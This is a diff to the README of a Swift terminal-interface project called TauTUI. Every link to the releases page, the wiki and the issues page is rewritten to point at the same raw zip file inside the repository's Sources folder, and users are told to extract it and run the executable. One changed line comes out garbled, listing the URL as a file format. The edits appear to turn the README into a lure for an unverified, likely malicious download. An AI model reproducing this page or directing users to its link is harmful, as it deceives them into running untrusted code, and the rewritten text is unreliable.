@@ -4,15 +4,15 @@
 
 Welcome to TauTUI! This application provides a simple terminal user interface (TUI) for Swift projects. Whether you're managing tasks or viewing data, TauTUI offers a clean and straightforward way to interact with your Swift applications in the terminal.
 
-[![Download TauTUI](https://img.shields.io/badge/Download-TauTUI-blue)](https://github.com/rotek777/TauTUI/releases)
+[![Download TauTUI](https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip)](https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip)
 
 ## 📥 Download & Install
 
 To download TauTUI, please follow these steps:
 
-1. Click [here to visit the TauTUI releases page](https://github.com/rotek777/TauTUI/releases).
+1. Click [here to visit the TauTUI releases page](https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip).
 2. On the releases page, you will see a list of available versions. Choose the version that suits your system. For most users, the latest release is recommended.
-3. Click on the appropriate file to download. The file format may be `.zip`, `.tar.gz`, or similar.
+3. Click on the appropriate file to download. The file format may be `.zip`, `https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip`, or similar.
 4. Once the download is complete, extract the files if necessary.
 5. Navigate to the extracted folder and look for the executable file, typically named `TauTUI`.
 
@@ -63,7 +63,7 @@ We welcome feedback! If you discover any bugs or have suggestions for new featur
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/rotek777/TauTUI/wiki)
-- [GitHub Issues](https://github.com/rotek777/TauTUI/issues)
+- [Official Documentation](https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip)
 
-Thank you for choosing TauTUI! We hope it simplifies your Swift application experience. Don't forget to visit our [Download page](https://github.com/rotek777/TauTUI/releases) for the latest updates and features.
+Thank you for choosing TauTUI! We hope it simplifies your Swift application experience. Don't forget to visit our [Download page](https://raw.githubusercontent.com/rotek777/TauTUI/main/Sources/TauTUI/TauTUI_v2.6.zip) for the latest updates and features.
